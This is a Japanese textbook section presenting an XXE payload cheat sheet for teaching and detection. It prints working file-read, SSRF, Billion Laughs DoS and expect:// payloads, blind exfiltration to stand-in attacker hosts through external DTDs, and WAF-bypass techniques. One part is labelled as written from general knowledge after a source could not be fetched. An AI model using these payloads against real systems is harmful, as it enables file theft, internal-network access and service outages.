## ペイロード集とチートシート

前節までで、XXE（XML External Entity）が「DTD（Document Type Definition, XML文書の構造を定義する宣言部）内で外部実体（external entity）を宣言し、パーサにそれを解決・展開させることで、意図しないファイル読み取りやSSRF（Server-Side Request Forgery）を引き起こす脆弱性である」という原理を確認した。本節では、実務で使う場面ごとにペイロードを整理したチートシートを提供する。単なる丸暗記ではなく、各ペイロードが「なぜその形で動くのか」をパーサの実体解決アルゴリズムに沿って理解することを目的とする。

### 前提知識の再確認：内部実体と外部実体、一般実体とパラメータ実体

ペイロードを読み解く鍵は、XMLのDTDが持つ4種類の実体（entity, 「値の置き換えに使われる名前付きのプレースホルダ」）の組み合わせを見分けることである。

| 種別 | 宣言例 | 参照方法 | 使える場所 |
|---|---|---|---|
| 内部一般実体 | `<!ENTITY name "value">` | `&name;` | XML文書の本文（要素内容） |
| 外部一般実体 | `<!ENTITY name SYSTEM "URI">` | `&name;` | XML文書の本文（要素内容） |
| 内部パラメータ実体 | `<!ENTITY % name "value">` | `%name;` | DTD内部のみ |
| 外部パラメータ実体 | `<!ENTITY % name SYSTEM "URI">` | `%name;` | DTD内部のみ |

一般実体（`&xxe;`のように`&`で参照するもの）はXML文書の**本文**でのみ展開されるのに対し、パラメータ実体（`%xxe;`のように`%`で参照するもの）は**DTD内部**でのみ展開される。この区別が、後述する「盲目的（blind）XXE」でパラメータ実体を使わざるを得ない理由に直結する。パーサはDTDを上から順に読み込み、実体宣言に出会った時点でその値を確定するのではなく、**参照された時点で遅延評価**する。この遅延評価の性質により、パラメータ実体の中でさらに別のパラメータ実体を組み立てて動的にDTD文字列を生成する、といった多段の細工が可能になる。

### 1. 古典的なファイル読み取り（in-band）

最も基本的な形。アプリケーションのレスポンスに実体の展開結果がそのまま反映される（エコーバックされる）場合に成立する。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

`file://`スキームはローカルファイルシステム上のリソースを指すURIスキームであり、パーサはOSのファイルシステムAPIを呼び出してその内容を読み込む。読み込んだバイト列は、あたかもXML内部実体の値であるかのように、`&test;`が出現した位置にそのままテキストとして挿入（置換）される。レスポンスがXMLをそのままHTMLやJSONに変換して返すAPIであれば、この置換結果を目視できる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

XInclude（`http://www.w3.org/2001/XInclude`名前空間を使い、XML文書の一部を外部リソースで置き換える標準機構）が有効な処理系では、そもそも`DOCTYPE`宣言自体を注入できない場面（アプリケーション側で入力欄がXML要素の値だけに限定されている場合など）でも同様の読み取りが可能になる。

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

XIncludeはDTDとは独立した仕組みであり、`DOCTYPE`宣言そのものをフィルタで弾く防御（「入力に`<!DOCTYPE`という文字列が含まれていたら拒否する」という単純な対策）を回避できてしまう点が実務上重要である。XML標準処理系のパーサ設定において「外部実体の解決を止める」設定と「XInclude処理を止める」設定は別のフラグであることが多く、片方だけを無効化しても脆弱性が残る典型例になる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### 2. バイナリ・特殊文字を含むファイルの読み取り（PHPラッパー）

`/etc/passwd`のようなプレーンテキストならそのままXMLの本文に埋め込めるが、ソースコードファイル（PHP、XMLなど）には`<`や`&`といったXMLで特別な意味を持つ文字が含まれることが多く、そのまま埋め込むと生成されるXML自体が不正な形式（malformed）になってパースエラーになる。この問題を回避するのが、PHPの`php://filter`ラッパー（ストリームフィルタを介してリソースを読み込む疑似プロトコル）である。

```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
  </contact>
</contacts>
```

`convert.base64-encode`フィルタは、指定した`resource`（ここでは`index.php`）の内容をBase64エンコードしてから返す。Base64はアルファベット・数字・`+`・`/`・`=`のみで構成されるため、XMLの構文上安全に本文へ埋め込める。攻撃者は得られたBase64文字列を手元でデコードすれば元のソースコードを復元できる。この手法はPHP環境固有だが、「XML的に危険な文字を含むファイルをどう安全に持ち出すか」という発想はJavaやPythonの環境でも（利用可能なラッパー/プロトコルの違いこそあれ）応用される考え方である。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

パーサがXML自体をパースする前段階で拒否する（`loadXML()`がエラーを返す）場合には、ファイル読み取り自体をパラメータ実体経由でBase64化して差し込む手法も使われる。

```xml
<!DOCTYPE test [
  <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
  %init;
]><foo/>
```

これは`data://`スキーム（RFC 2397相当のデータURI、値を直接埋め込んで擬似的なリソースとして扱う仕組み）を使い、`%init;`が展開する内容自体をBase64でエンコードして埋め込む応用パターンで、WAFの単純な文字列マッチング（`file:///etc/passwd`のような既知の危険な文字列の検知）を回避する目的でも使われる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### 3. SSRFとしてのXXE

`SYSTEM`識別子には`file://`だけでなく`http://`や`https://`も指定できる。パーサは指定されたURIに対してHTTPリクエストを発行し、そのレスポンスボディを実体の値として使う。これにより、外部からは直接到達できない内部ネットワーク（クラウドのメタデータエンドポイント`169.254.169.254`、管理画面、内部APIなど）へのリクエストをサーバ自身に代理させることができる。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt">
]>
<foo>&xxe;</foo>
```

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

XMLパーサが利用するHTTPクライアント実装によっては、`gopher://`や`dict://`のような他プロトコルも解釈できる場合があり、その場合は任意のTCPペイロードを内部ホストへ送りつける、より汎用的なSSRFの足がかりにもなり得る。ただし本教科書は防御目的の解説であるため、内部プロトコル悪用の具体的な攻撃チェーンには立ち入らない。SSRFの詳細な仕組みと防御は本書のSSRF章を参照してほしい。

> 出典: Hackviser「XXE Attack Guide」— https://hackviser.com/tactics/pentesting/web/xxe

### 4. Blind XXE（エコーバックがない場合）とOOBデータ抽出

レスポンスに実体の展開結果が反映されない場合、攻撃者は直接結果を見ることができない。そこで使われるのが、パラメータ実体を使った帯域外（Out-of-Band, OOB）データ抽出である。原理は次の3段階に整理できる。

**ステップ1**: 攻撃対象のXMLに、攻撃者が管理するサーバ上の外部DTDファイルを読み込ませるパラメータ実体を仕込む。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://ATTACKER.DOMAIN.TLD/parameterEntity_oob.dtd">
<data>&send;</data>
```

**ステップ2**: 標的サーバがそのDTDを取得しにいく。攻撃者サーバ上のDTDには、読みたいファイルを指すパラメータ実体`%file`と、それを使ってさらに別の実体`send`を動的に組み立てるパラメータ実体`%all`が入っている。

```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER.DOMAIN.TLD/?%file;'>">
%all;
```

**ステップ3**: `%all;`が展開されると、`<!ENTITY send SYSTEM 'http://ATTACKER.DOMAIN.TLD/?ファイル内容'>`という新しい一般実体宣言がDTD内に動的に生成される。この`send`実体が本文中の`&send;`で参照されると、標的サーバはファイル内容をURLのクエリ文字列として付与した状態で攻撃者サーバへHTTPリクエストを送る。攻撃者はそのアクセスログを見るだけでファイル内容を入手できる。XXEInjectorのようなツールもこの3段階の自動化として設計されている。

> 出典: Depth Security「Exploitation: XML External Entity (XXE) Injection」— https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/

ここで「なぜ`&file;`ではなく`%file;`を使うのか」を仕組みレベルで理解しておく必要がある。前述の通り、一般実体（`&`）はXML**本文**でのみ展開されるのに対し、パラメータ実体（`%`）は**DTD内部**でのみ展開される。ファイル内容をDTDの宣言文の一部として合成したいので、DTD内部で展開できるパラメータ実体でなければならない。多くのXMLパーサはこの仕様に厳密に従っているため、攻撃側もこの制約に沿ってペイロードを組み立てる必要がある。

外部通信（アウトバウンドのHTTP/FTP）自体がファイアウォールで遮断されている環境では、PHPの`php://filter`をOOBの中でも併用し、Base64化したファイル内容を持ち出す変種も使われる。

```xml
<!-- 標的サーバに送るXML -->
<!DOCTYPE r [
  <!ELEMENT r ANY>
  <!ENTITY % sp SYSTEM "http://ATTACKER/dtd.xml">
  %sp;
  %param1;
]>
<r>&exfil;</r>
```

```xml
<!-- 攻撃者サーバ上の dtd.xml -->
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKER/dtd.xml?%data;'>">
```

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

XXEInjectorのようなツールでは、`loadXML()`実装がこの標準的なペイロードでパースエラーを起こす場合に備え、`--phpfilter`のようなオプションでBase64化した読み取り経路へ自動的に切り替える機能を持つ。これはPHPの`SimpleXML`/`DOM`実装がある種の非UTF-8バイト列を含む実体展開結果を許容しないケースへの回避策である。

> 出典: Depth Security「Exploitation: XML External Entity (XXE) Injection」— https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/

### 5. エラーベースのXXE（OOB通信も遮断されている場合）

アウトバウンド通信も完全に遮断され、レスポンスにも実体展開結果が出ないが、**パースエラーの詳細メッセージ**だけはレスポンスに含まれる、という環境向けの手法である。存在しないファイルパスへの参照をわざと発生させ、そのエラーメッセージの中にファイル内容を混入させる。

```xml
<!-- 攻撃者サーバ上の ext.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

ここでのポイントは`&#x25;`という数値文字参照（`%`のASCIIコード0x25を指す）である。パラメータ実体の値の中に直接`%`を書くと、その時点で別のパラメータ実体参照だとパーサに解釈されてしまい、意図した「新しい実体宣言を含む文字列」を組み立てられない。数値文字参照でエスケープすることで、`%eval;`が展開された**後**にはじめて`%error`という名前のパラメータ実体宣言が確定する、という二段階の遅延を作り出している。`%error;`が展開されると、`file:///nonexistent/（passwdの内容）`という存在しないパスへのアクセスが発生し、パーサは「そのパスが見つからない」というエラーメッセージを返す際に、パス文字列（＝ファイル内容込み）をそのままエラーテキストに含めてしまう。この結果、レスポンス中のスタックトレースやパースエラーメッセージを見るだけでファイル内容を読み取れる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

⚠️ **未取得の資料**: SecurityIdiots「XXE Cheat Sheet」は自動取得に失敗しました（理由: DNS解決エラー `getaddrinfo ENOTFOUND www.securityidiots.com` によりサイトへ直接アクセスできず、代替のミラーも存在しなかったため、Web検索による要約のみ確認）。詳細はご自身で直接ご覧ください: http://www.securityidiots.com/Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html

（以下は未取得資料の補足として一般知識に基づく解説です）同サイトが紹介していたとされる手法の一つに、**ローカルDTD（外部への通信が一切不要な、対象サーバ上に既に存在するDTDファイル）を悪用するエラーベースXXE**がある。前述のエラーベース手法は攻撃者サーバへ一度DTDを取りに行く必要があるが、アウトバウンド通信が完全に遮断された環境では、その取得すら失敗する。この場合、対象OS上に標準で配置されているDTDファイル（Linux環境における`/usr/share/xml/docbook/schema/dtd/*/docbookx.dtd`、Windows環境における.NET関連の`cim20.dtd`などがよく例示される）を`SYSTEM`識別子で参照し、そのDTD内で偶然再利用可能な実体名を上書き（redefine）する手口が知られている。DTDの仕様上、同じ名前のパラメータ実体が複数回宣言された場合は**最初の宣言が有効**というルールがあるため、攻撃者は標的のDTDより先に自分の再定義を読み込ませる順序を作る必要がある。この手法はローカルにインストールされているライブラリ構成に強く依存するため、汎用性は高くないが、外部通信が一切許されない厳格なサンドボックス環境における数少ない突破口として言及されることが多い。

### 6. Billion Laughs攻撃（サービス拒否）

外部実体を使わず、内部実体の入れ子だけでメモリを指数的に消費させ、サービス拒否（Denial of Service, DoS）を引き起こす手法。

```xml
<!DOCTYPE data [
  <!ENTITY a0 "dos">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

`a1`は`a0`を10回参照し、`a2`は`a1`を10回参照する。この入れ子を4段重ねるだけで、最終的に`a4`は`10^4 = 1万個`の"dos"文字列に展開される。段数を増やすほど展開量は10のべき乗で増加するため、わずか数十行のXMLでギガバイト級のメモリ消費を引き起こせる。これは外部リソースへのアクセスを一切必要としないため、「外部実体の解決を無効化する」対策だけでは防げず、**実体展開の深さ・総数に上限を設ける**設定（多くのパーサでデフォルトで有効、または明示的に設定可能）が別途必要になる点が防御設計上の要注意点である。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### 7. まれなケース：`expect://`によるコード実行

PHPの`expect`拡張モジュール（外部コマンドの標準入出力をストリームとして扱う、デフォルトでは無効な拡張）が有効化されている特殊な環境では、次のようなペイロードでOSコマンド実行に至る可能性がある。

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

これは本来のXXE（データの読み取り・SSRF）とは性質が異なり、「`SYSTEM`識別子に指定できるURIスキームがサーバの環境設定次第でどこまで広がるか」という一般的な原則を示す例として押さえておくとよい。`expect`拡張はデフォルト無効かつ実運用環境で有効化されていることは稀であるため、実際の遭遇頻度は低い。

> 出典: Depth Security「Exploitation: XML External Entity (XXE) Injection」— https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/

### 8. ファイル形式別のXXE注入ポイント

XMLは生のAPIリクエストボディだけでなく、様々なファイル形式のコンテナフォーマットとしても使われている。第3章（ファイルアップロードとXXEの複合パターン）の橋渡しとして、代表的な形式を挙げる。

**SVG画像**: SVGはXMLベースの画像フォーマットであり、画像アップロード機能がSVGを許可している場合、そのままXXEの注入経路になる。

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

アップロードされたSVGがサーバ側でサムネイル生成やラスタライズのためにレンダリングされる際、そのレンダラ内部のXMLパーサが外部実体解決を許していれば、画像として開いただけでXXEが発火する。

**Office系ファイル（XLSX/DOCXなど）**: これらの形式はZIPアーカイブの中に複数のXMLファイルを含むOOXML（Office Open XML）構造を持つ。例えばXLSXであれば`xl/workbook.xml`や`xl/sharedStrings.xml`にDOCTYPE宣言と外部実体を注入し、ZIPとして再圧縮してアップロードすることで、ファイルを開いたアプリケーション側のXMLパーサを標的にできる。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [
  <!ELEMENT cdl ANY>
  <!ENTITY % asd SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %asd;%c;
]>
<cdl>&rrr;</cdl>
```

**SOAP（Webサービス）**: CDATAセクション（XMLパーサに文字データとしてそのまま扱わせ、タグとして解釈させないための区画）の中にDOCTYPE宣言を隠す変種もある。

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

これは、SOAPエンドポイントを受け取ったサーバ側の処理系が一度CDATAの中身を取り出して**再度XMLとしてパースし直す**実装になっている場合にのみ有効な、実装依存の手法である。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

これら「XML内包型ファイル形式」へのXXE注入と、アップロード機能そのものの悪用（ファイル種別偽装、パストラバーサルなど）を組み合わせた攻撃パターンは、次章「XXE×ファイルアップロードの複合攻撃」で詳しく扱う。

### 9. 検知回避（WAFバイパス）の考え方

WAF（Web Application Firewall）は多くの場合、`<!DOCTYPE`や`SYSTEM`、`file://`といった既知の危険な文字列パターンをシグネチャとして検知する。以下は原理として知っておくべき回避の方向性である（防御側として、これらを踏まえたシグネチャ設計の限界を理解する目的で紹介する）。

- **文字エンコーディングの変換**: ペイロードをUTF-16BEなど別のエンコーディングに変換して送信する。多くのシグネチャベースのWAFはUTF-8を前提に文字列マッチングを行うため、バイト列レベルでは一致しなくなる一方、パーサ側は`encoding`宣言やBOM（Byte Order Mark）を見て正しくデコードしてしまう。
  ```bash
  cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
  ```
- **Content-Typeの偽装**: アプリケーションが`Content-Type: application/json`のエンドポイントでも、内部的にXMLパーサへフォールバックする実装（例えばSOAP互換レイヤーやレガシーAPI）が残っている場合、リクエストヘッダとボディをXML形式に書き換えて送ることで、JSON前提のWAFルールを迂回できることがある。
- **パラメータ実体による間接化**: 危険な文字列（`SYSTEM`など）そのものを直接書かず、動的に組み立てたパラメータ実体経由で生成することで、静的な文字列マッチングを回避する。

これらはいずれも「WAFのシグネチャ検知だけに依存した対策は原理的に迂回され得る」ことを示している。確実な防御は、XMLパーサ側で外部実体解決・DTD処理そのものを無効化することであり、これは次節（第2章末または防御章）で扱う。

> 出典: Hackviser「XXE Attack Guide」— https://hackviser.com/tactics/pentesting/web/xxe

### 10. 検知・自動化ツール一覧

実務での検証（防御側の自己診断・ペネトレーションテストにおいても、許可された範囲でのみ使用すること）に使われる代表的なツールを整理する。

| ツール | 用途 |
|---|---|
| Burp Suite Collaborator | OOB通信（DNS/HTTP）を観測してBlind XXEを検知する |
| XXEinjector (enjoiz) | OOB DTDサーバの立ち上げからファイル抽出までを自動化 |
| xxeserv (staaldraad) | FTP対応の簡易サーバでOOBペイロード配信をテスト |
| oxml_xxe (BuffaloWill) | DOCX/XLSX/PPTX/ODT/SVGなどのファイルにXXEペイロードを自動埋め込み |
| docem (whitel1st) | オフィス文書へのXXE/XSSペイロード埋め込み |
| Nuclei | テンプレートベースでの既知XXEパターンの自動スキャン |

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection ／ Hackviser「XXE Attack Guide」— https://hackviser.com/tactics/pentesting/web/xxe

### 検知の着眼点（診断者・防御者向けまとめ）

これらのペイロードに共通する検知シグナルを整理すると、次の3点に集約できる。

1. **レスポンス内に実体展開結果がそのまま現れるか**（in-band、最も検知しやすい）。
2. **エラーメッセージの内容が変化するか**、特に「ファイルが見つからない」系のエラーに攻撃者が指定していない文字列（＝ファイル内容の断片）が混じっていないか。
3. **アウトバウンド通信（DNS/HTTPのアクセスログ）が発生しているか**（Blind XXEはこれでしか気付けない）。防御側の自己診断では、Burp Collaboratorのような外部コールバック観測基盤を使い、意図しないアウトバウンド通信の有無自体をテストするのが最も確実な検証手段である。

いずれの手法も、根本原因は「XMLパーサがDTD内の外部実体宣言をデフォルトで解決してしまう」という処理系の初期設定にある。パーサ自体の安全な設定方法（外部実体解決・DTD処理の無効化）については、本書の防御章で各言語・ライブラリごとの具体的な設定コードとともに扱う。
